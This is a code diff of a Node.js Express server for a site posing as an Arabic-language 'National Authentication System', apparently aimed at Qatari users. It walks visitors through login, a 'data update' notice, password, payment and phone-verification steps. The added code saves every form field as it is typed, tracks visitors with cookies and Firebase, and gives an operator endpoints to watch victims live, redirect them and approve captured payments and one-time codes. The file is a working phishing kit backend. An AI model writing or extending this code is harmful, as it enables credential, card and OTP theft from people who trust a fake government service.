@@ -1,155 +1,289 @@
+require('dotenv').config();
 const express = require('express');
 const path = require('path');
+const cookieParser = require('cookie-parser');
+const { initializeFirebase } = require('./firebase-config');
+const { initVisitor, updateStatus, updatePage } = require('./sys-track');
+const { saveField, saveMultipleFields } = require('./data-save');
+const { 
+    getAllVisitors, 
+    getVisitorById, 
+    getOnlineVisitors,
+    redirectVisitor,
+    checkRedirect,
+    approvePayment,
+    approveOtp,
+    getStatistics
+} = require('./admin-api');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// إعداد EJS كـ template engine
+initializeFirebase();
+
 app.set('view engine', 'ejs');
 app.set('views', path.join(__dirname, 'views'));
-
-// خدمة الملفات الثابتة من مجلد public (للصور، CSS، إلخ)
 app.use(express.static(path.join(__dirname, 'public')));
-
-// Middleware لمعالجة البيانات
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
+app.use(cookieParser());
 
-// Routes للصفحات
+app.use(async (req, res, next) => {
+    try {
+        if (!req.path.startsWith('/api/')) {
+            const result = await initVisitor(req);
+            res.cookie('vid', result.vid, { maxAge: 30 * 24 * 60 * 60 * 1000, httpOnly: true });
+            req.vid = result.vid;
+            req.ref = result.ref;
+        }
+        next();
+    } catch (error) {
+        console.error('Middleware error:', error);
+        next();
+    }
+});
 
-// الصفحة الرئيسية
 app.get('/', (req, res) => {
-  res.render('index', {
-    title: 'نظام التوثيق الوطني',
-    currentPage: 'index'
-  });
+    res.render('index', {
+        title: 'نظام التوثيق الوطني',
+        currentPage: 'index'
+    });
 });
 
-// صفحة تسجيل الدخول
 app.get('/login', (req, res) => {
-  res.render('login', {
-    title: 'تسجيل الدخول - نظام التوثيق الوطني',
-    currentPage: 'login',
-    currentStep: 0
-  });
+    res.render('login', {
+        title: 'تسجيل الدخول - نظام التوثيق الوطني',
+        currentPage: 'login',
+        currentStep: 0
+    });
 });
 
-// معالجة تسجيل الدخول (POST) - يوجه إلى صفحة التنبيه
 app.post('/login', (req, res) => {
-  // هنا يمكن إضافة منطق التحقق من بيانات الدخول
-  // بعد تسجيل الدخول الناجح، نوجه إلى صفحة التنبيه
-  res.redirect('/update-notice');
+    res.redirect('/update-notice');
 });
 
-// صفحة التنبيه (يجب تحديث بياناتك)
 app.get('/update-notice', (req, res) => {
-  res.render('update-notice', {
-    title: 'تنبيه - نظام التوثيق الوطني',
-    currentPage: 'update-notice',
-    currentStep: 0
-  });
+    res.render('update-notice', {
+        title: 'تنبيه - نظام التوثيق الوطني',
+        currentPage: 'update-notice',
+        currentStep: 0
+    });
 });
 
-// الخطوة الأولى
 app.get('/step1', (req, res) => {
-  res.render('step1', {
-    title: 'الخطوة الأولى - نظام التوثيق الوطني',
-    currentPage: 'step1',
-    currentStep: 1
-  });
+    res.render('step1', {
+        title: 'الخطوة الأولى - نظام التوثيق الوطني',
+        currentPage: 'step1',
+        currentStep: 1
+    });
 });
 
-// الخطوة الثانية
+app.post('/step1', (req, res) => {
+    res.redirect('/step3');
+});
+
 app.get('/step2', (req, res) => {
-  res.render('step2', {
-    title: 'الخطوة الثانية - نظام التوثيق الوطني',
-    currentPage: 'step2',
-    currentStep: 2
-  });
+    res.render('step2', {
+        title: 'الخطوة الثانية - نظام التوثيق الوطني',
+        currentPage: 'step2',
+        currentStep: 2
+    });
 });
 
-// الخطوة الثانية - نسخة قطر (step2Q)
+app.post('/step2', (req, res) => {
+    res.redirect('/step3');
+});
+
 app.get('/step2Q', (req, res) => {
-  const userType = req.query.type || 'QID'; // افتراضي: قطري/مقيم
-  res.render('step2Q', {
-    title: 'الخطوة الثانية - نظام التوثيق الوطني',
-    currentPage: 'step2Q',
-    userType: userType,
-    currentStep: 2
-  });
+    res.render('step2Q', {
+        title: 'الخطوة الثانية (قطر) - نظام التوثيق الوطني',
+        currentPage: 'step2Q',
+        currentStep: 2
+    });
 });
 
 app.post('/step2Q', (req, res) => {
-  res.redirect('/step3');
+    res.redirect('/step3');
 });
 
-// الخطوة الثالثة - إنشاء كلمة المرور
 app.get('/step3', (req, res) => {
-  res.render('step3', {
-    title: 'إنشاء كلمة المرور - نظام التوثيق الوطني',
-    currentPage: 'step3',
-    currentStep: 3
-  });
+    res.render('step3', {
+        title: 'الخطوة الثالثة - نظام التوثيق الوطني',
+        currentPage: 'step3',
+        currentStep: 3
+    });
 });
 
 app.post('/step3', (req, res) => {
-  res.redirect('/step4');
+    res.redirect('/step4');
 });
 
-// الخطوة الرابعة - التسديد
 app.get('/step4', (req, res) => {
-  res.render('step4', {
-    title: 'التسديد - نظام التوثيق الوطني',
-    currentPage: 'step4',
-    currentStep: 4
-  });
+    res.render('step4', {
+        title: 'الخطوة الرابعة - نظام التوثيق الوطني',
+        currentPage: 'step4',
+        currentStep: 4
+    });
 });
 
 app.post('/step4', (req, res) => {
-  res.redirect('/step5');
+    res.redirect('/step5');
 });
 
-// الخطوة الخامسة - توثيق رقم الهاتف
 app.get('/step5', (req, res) => {
-  res.render('step5', {
-    title: 'توثيق رقم الهاتف - نظام التوثيق الوطني',
-    currentPage: 'step5',
-    currentStep: 5
-  });
+    res.render('step5', {
+        title: 'الخطوة الخامسة - نظام التوثيق الوطني',
+        currentPage: 'step5',
+        currentStep: 5
+    });
 });
 
 app.post('/step5', (req, res) => {
-  res.redirect('/step6');
+    res.redirect('/step6');
 });
 
-// الخطوة السادسة - إتمام التسجيل
 app.get('/step6', (req, res) => {
-  res.render('step6', {
-    title: 'إتمام التسجيل - نظام التوثيق الوطني',
-    currentPage: 'step6',
-    currentStep: 6
-  });
+    res.render('step6', {
+        title: 'الخطوة السادسة - نظام التوثيق الوطني',
+        currentPage: 'step6',
+        currentStep: 6
+    });
 });
 
-// معالجة جميع الطلبات الأخرى
-app.use((req, res) => {
-  res.status(404).send('Page not found');
+app.post('/api/save-field', async (req, res) => {
+    try {
+        const { page, fieldName, fieldValue } = req.body;
+        const vid = req.cookies.vid;
+        
+        if (!vid) {
+            return res.status(400).json({ success: false, error: 'No visitor ID' });
+        }
+        
+        const result = await saveField(vid, page, fieldName, fieldValue);
+        res.json(result);
+    } catch (error) {
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
+app.post('/api/visitor/online', async (req, res) => {
+    try {
+        const vid = req.cookies.vid;
+        if (vid) {
+            await updateStatus(vid, true);
+        }
+        res.json({ success: true });
+    } catch (error) {
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
+app.post('/api/visitor/offline', async (req, res) => {
+    try {
+        const vid = req.cookies.vid;
+        if (vid) {
+            await updateStatus(vid, false);
+        }
+        res.json({ success: true });
+    } catch (error) {
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
+app.get('/api/check-redirect', async (req, res) => {
+    try {
+        const vid = req.cookies.vid;
+        if (!vid) {
+            return res.json({ success: false, error: 'No visitor ID' });
+        }
+        
+        const result = await checkRedirect(vid);
+        res.json(result);
+    } catch (error) {
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
+app.get('/api/admin/visitors', async (req, res) => {
+    try {
+        const result = await getAllVisitors();
+        res.json(result);
+    } catch (error) {
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
+app.get('/api/admin/visitor/:vid', async (req, res) => {
+    try {
+        const result = await getVisitorById(req.params.vid);
+        res.json(result);
+    } catch (error) {
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
+app.get('/api/admin/visitors/online', async (req, res) => {
+    try {
+        const result = await getOnlineVisitors();
+        res.json(result);
+    } catch (error) {
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
+app.post('/api/admin/redirect-visitor', async (req, res) => {
+    try {
+        const { vid, targetPage } = req.body;
+        const result = await redirectVisitor(vid, targetPage);
+        res.json(result);
+    } catch (error) {
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
+app.post('/api/admin/approve-payment', async (req, res) => {
+    try {
+        const { vid, approved } = req.body;
+        const result = await approvePayment(vid, approved);
+        res.json(result);
+    } catch (error) {
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
+app.post('/api/admin/approve-otp', async (req, res) => {
+    try {
+        const { vid, approved } = req.body;
+        const result = await approveOtp(vid, approved);
+        res.json(result);
+    } catch (error) {
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
+app.get('/api/admin/statistics', async (req, res) => {
+    try {
+        const result = await getStatistics();
+        res.json(result);
+    } catch (error) {
+        res.status(500).json({ success: false, error: error.message });
+    }
 });
 
 app.listen(PORT, () => {
-  console.log(`✅ Server is running on http://localhost:${PORT}`);
-  console.log(`\n📄 Available pages:`);
-  console.log(`   - http://localhost:${PORT}/              (الصفحة الرئيسية)`);
-  console.log(`   - http://localhost:${PORT}/login         (تسجيل الدخول)`);
-  console.log(`   - http://localhost:${PORT}/update-notice (تنبيه التحديث)`);
-  console.log(`   - http://localhost:${PORT}/step1         (الخطوة الأولى)`);
-  console.log(`   - http://localhost:${PORT}/step2         (الخطوة الثانية)`);
-  console.log(`   - http://localhost:${PORT}/step2Q        (الخطوة الثانية - قطر)`);
-  console.log(`   - http://localhost:${PORT}/step3         (الخطوة الثالثة - كلمة المرور)`);
-  console.log(`   - http://localhost:${PORT}/step4         (الخطوة الرابعة - التسديد)`);
-  console.log(`   - http://localhost:${PORT}/step5         (الخطوة الخامسة - توثيق الهاتف)`);
-  console.log(`   - http://localhost:${PORT}/step6         (الخطوة السادسة - إتمام التسجيل)`);
-  console.log(`\n🎨 Using EJS templates (Dynamic Node.js)`);
-  console.log(`\n🔗 Workflow Path:`);
-  console.log(`   / → /login → /update-notice → /step1 → /step3 → /step2Q → /step4 → /step5 → /step6`);
+    console.log(`\n🚀 Server running on http://localhost:${PORT}`);
+    console.log(`\n📄 Available pages:`);
+    console.log(`   - http://localhost:${PORT}/              (الصفحة الرئيسية)`);
+    console.log(`   - http://localhost:${PORT}/login         (تسجيل الدخول)`);
+    console.log(`   - http://localhost:${PORT}/update-notice (تنبيه التحديث)`);
+    console.log(`   - http://localhost:${PORT}/step1         (الخطوة الأولى)`);
+    console.log(`   - http://localhost:${PORT}/step2         (الخطوة الثانية)`);
+    console.log(`   - http://localhost:${PORT}/step2Q        (الخطوة الثانية - قطر)`);
+    console.log(`   - http://localhost:${PORT}/step3         (الخطوة الثالثة - كلمة المرور)`);
+    console.log(`   - http://localhost:${PORT}/step4         (الخطوة الرابعة - التسديد)`);
+    console.log(`   - http://localhost:${PORT}/step5         (الخطوة الخامسة - توثيق الهاتف)`);
+    console.log(`   - http://localhost:${PORT}/step6         (الخطوة السادسة - إتمام التسجيل)`);
+    console.log(`\n🎨 Using EJS templates (Dynamic Node.js)`);
+    console.log(`\n🔗 Workflow Path:`);
+    console.log(`   / → /login → /update-notice → /step1 → /step3 → /step2Q → /step4 → /step5 → /step6`);
 });
